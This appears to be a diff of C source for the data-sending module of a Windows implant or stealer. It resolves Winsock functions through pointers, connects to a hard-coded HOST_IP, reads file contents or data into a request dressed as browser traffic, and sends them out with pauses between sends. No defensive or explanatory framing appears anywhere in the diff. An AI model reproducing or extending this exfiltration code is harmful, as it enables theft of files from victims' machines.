@@ -16,11 +16,10 @@ unsigned long long  (__stdcall    *WSASocketFunc)       (int, int, int, LPWSAPRO
 int                 (__stdcall    *WSAConnectFunc)      (SOCKET,const struct sockaddr*,int, LPWSABUF,LPWSABUF,LPQOS,LPQOS);
 int                 (__stdcall    *SendFunc)            (SOCKET,const char FAR*,int, int);
 
-void *SocketDll    = {0};
 extern unsigned long long hSocket;
 
-void InitSocket() {
-/*     if (hSocket == 0) { */
+int InitConnection() {
+        void       *SocketDll   = {0};
         WSADATA     WSAStruct   = {0};
         SOCKADDR_IN SocketAddr  = {0};
 
@@ -49,19 +48,15 @@ void InitSocket() {
         SocketAddr.sin_addr.s_addr  = HOST_IP;
 
         if (WSAConnectFunc(hSocket, (SOCKADDR*)&SocketAddr, sizeof(SocketAddr), NULL, NULL, NULL, NULL) != 0) {
-            hSocket = -1;
+            return -1;
         }
-/*     } */
 }
 
 
 int SendData(HANDLE FileHandle, char *name, int DataSize, char *DataSizeAsString, unsigned char *buffer, unsigned char *data, int IsFile) {
-    IO_STATUS_BLOCK IOstatus            = {0};
     LARGE_INTEGER   wait                = {0};
     int             CurrentBuffSize     = 0;
     int             FinalBufferSize     = 0;
-
-    InitSocket();
 
     if (hSocket == -1) {
         return -1;
@@ -74,37 +69,37 @@ int SendData(HANDLE FileHandle, char *name, int DataSize, char *DataSizeAsString
             "Accept-Language: en-US,en;q=0.9,ar;q=0.8,fr;q=0.7\r\n"
             "Content-Type: application/octet-stream\r\n"
             "Connection: keep-alive\r\n"
-            "Sec-Ch-Ua-Platform: Windows\r\n";
-
-    const char *RequestNameField = "name: ";
+            "Sec-Ch-Ua-Platform: Windows\r\n"
+            "name: ";
 
     const char *RequestLengthField = "Content-Length: ";
 
     /*copy the const part of the request which is request head to the allocated buffer*/
     MovMemory(RequestHeader, buffer, len(RequestHeader));
 
-    /*append the file name to the name field then append it to the buffer*/
-    ConcatString(buffer, RequestNameField, len(buffer));
+    /*append the file name to its place in the buffer*/
     ConcatString(buffer, name, len(buffer));
     ConcatString(buffer, "\r\n", len(buffer));
 
-    /*append the file length to the length field then append it to the buffer*/
+    /*append the content size to the buffer then append the file size to the buffer*/
     ConcatString(buffer, RequestLengthField, len(buffer));
     ConcatString(buffer, DataSizeAsString, len(buffer));
     ConcatString(buffer, "\r\n\r\n", len(buffer));
 
     /*
-    get the size of the buffer which contains only the http request
+    get the size of the buffer which contains only the http request for now
     so we can shift buffer pointer to the end
-    so we can write the content of the file to the same buffer
+    so we can write the content of the file to the same buffer to make a full http request
     */
     CurrentBuffSize = len(buffer);
     /*shift the buffer pointer to the end of the buffer*/
     buffer += CurrentBuffSize;
-    /*read the content of the file*/
+
     if (IsFile == TRUE) {
-        ReadBuffer(FileHandle, &IOstatus, buffer, DataSize);
+        /*if its a file read the content of the file*/
+        ReadBuffer(FileHandle, buffer, DataSize);
     } else {
+        /*if its a data move it to the buffer*/
         MovMemory(data, buffer, DataSize);
     }
     /*shift back the pointer to its original place*/
@@ -114,7 +109,7 @@ int SendData(HANDLE FileHandle, char *name, int DataSize, char *DataSizeAsString
 
     /*send the buffer*/
     if (SendFunc(hSocket, buffer, FinalBufferSize, 0) == SOCKET_ERROR) {
-        return -1;
+        return 1;
     }
 
     /*wait for 1.5s*/
